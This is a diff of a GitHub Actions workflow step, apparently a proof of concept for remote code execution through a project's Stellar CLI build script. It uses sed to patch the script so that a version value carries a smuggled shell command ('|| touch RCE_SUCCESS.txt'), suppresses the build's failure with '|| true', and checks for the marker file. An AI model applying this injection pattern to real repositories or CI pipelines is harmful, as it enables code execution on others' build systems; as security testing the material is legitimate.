@@ -37,17 +37,16 @@ jobs:
 
       - name: Patch Script and Verify RCE
         run: |
-          # Pro Injection: Script ki pehli line mein hi payload inject kar rahe hain
-          # Ye code seedha file ke top par add ho jayega
-          sed -i "1i require('fs').writeFileSync('RCE_SUCCESS.txt', 'RCE_VERIFIED_BY_$(whoami)');" scripts/stellar_cli.mjs
+          # Inject payload with '||' so it runs even if git fails
+          sed -i "s/const cliRef = argv.cliRef || \`v\${latestVersion}\`;/const cliRef = 'v1.0.0 || touch RCE_SUCCESS.txt';/" scripts/stellar_cli.mjs
           
-          # Run the script
-          pnpm stellar-cli:build -- --cli-ref='main'
+          # Run the build script
+          # Adding '|| true' ensures the pipeline continues even if the script crashes
+          pnpm stellar-cli:build -- --cli-ref='v1.0.0' || true
           
           # Verification Step
           echo "--- VERIFICATION START ---"
-          ls -la RCE_SUCCESS.txt
-          cat RCE_SUCCESS.txt
+          ls -la RCE_SUCCESS.txt || echo "FILE NOT FOUND"
           echo "--- VERIFICATION END ---"
         shell: bash
 
